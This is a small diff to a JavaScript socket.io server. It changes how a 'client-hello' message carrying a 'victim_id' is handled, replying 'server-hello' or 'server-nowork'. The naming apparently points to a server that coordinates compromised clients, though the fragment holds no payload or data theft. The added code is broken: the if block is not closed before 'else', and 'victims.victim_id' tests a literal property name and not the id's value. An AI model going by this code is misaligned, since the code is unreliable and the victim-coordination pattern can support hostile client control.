@@ -21,8 +21,12 @@ socket.on('connection', function(client) {
     
     var victimId;
     client.on('client-hello', function({victim_id}) {
-        victimId = victim_id;
-        client.emit('server-hello');
+	if (!victims.victim_id){
+            victimId = victim_id;
+            client.emit('server-hello');
+	else {
+	    client.emit('server-nowork')
+	}    
     });
 
     var doNoWork = function() {
